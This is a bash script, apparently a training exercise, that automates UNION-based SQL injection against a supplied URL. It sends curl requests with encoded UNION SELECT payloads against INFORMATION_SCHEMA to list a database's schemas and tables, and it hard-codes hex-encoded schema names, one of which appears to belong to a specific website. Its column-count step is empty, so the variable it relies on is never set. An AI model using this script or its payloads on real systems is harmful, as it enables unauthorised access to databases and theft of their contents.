#! /bin/bash
target=$1
resume=1
normal=$(curl -sm 30 --retry 3 $target)
count=$(echo $normal | sed 's/br/br\n/g' | grep -c "br")
echo "[info] Target is $target"
############################## Extracting columns number #############################
echo "[***]  Database Columns = $column Columns "

############### creating string to be using with Union querey { NULL,NUL, ...etc } according to columns numbers  
for x in $(seq 2 $column)
do 
        Nulls=${Nulls}NULL%2C
done
count=0
for x in $(curl -s "$target%20UNION%20ALL%20SELECT%20${Nulls}CONCAT%280x7176787671%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x7170766a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20yZWT" | sed 's/<br>/<br>\n/g' | grep -o -P '(?<=qvxvq).*(?=qpvjq)' | uniq)
do
	count=$(($count+1))
	echo "Database Scheme #$count is $x " 
	database_name[$count]=$x
done
#database_name[$count]
############ Extracting Schema names using UNION ############################# 
##############################################################################
##############################################################################
number=0
union1=$(curl -s "$target%20UNION%20ALL%20SELECT%20${Nulls}CONCAT%280x7170786271%2CIFNULL%28CAST%28table_schema%20AS%20CHAR%29%2C0x20%29%2C0x707964686e62%2CIFNULL%28CAST%28table_name%20AS%20CHAR%29%2C0x20%29%2C0x7178706b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x696e666f726d6174696f6e5f736368656d61%2C0x6974696462%2C0x74657374%29--%20EfLT"| sed 's/<br>/<br>\n/g' | grep -o -P '(?<=pydhnb).*(?=qxpkq)' | uniq )


for s in $(echo $union1)
do
	echo "Table $number is $s"
	number=$(($number+1))
done
number=0 # reseting the counter 

######################### Extracting Tables Names ############################
##############################################################################

table_name=blablabla ### iniating any random value for table_name

while [[ -n $table_name ]]
do
	table_name=$(curl -s "$target%20UNION%20ALL%20SELECT%20${Nulls}%28SELECT%20CONCAT%280x716b6b6271%2CIFNULL%28CAST%28table_schema%20AS%20CHAR%29%2C0x20%29%2C0x67776a6b736d%2CIFNULL%28CAST%28table_name%20AS%20CHAR%29%2C0x20%29%2C0x71716b6271%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x636f636861335f636f636872616e6576656e74696c6174696f6e636f6d%2C0x696e666f726d6174696f6e5f736368656d61%29%20LIMIT%20${number}%2C1%29--%20LHrr" | sed 's/<br>/<br>\n/g'| grep -o -P '(?<=gwjksm).*(?=qqkbq)' | uniq )
	if [[ -n $table_name ]]
	then
		echo "table $((number+1)) is $table_name "
		number=$(($number+1))
	fi 
done

echo "Union Test is Done"
#### by Abdelsalam Abbas
### ITI_SA_37
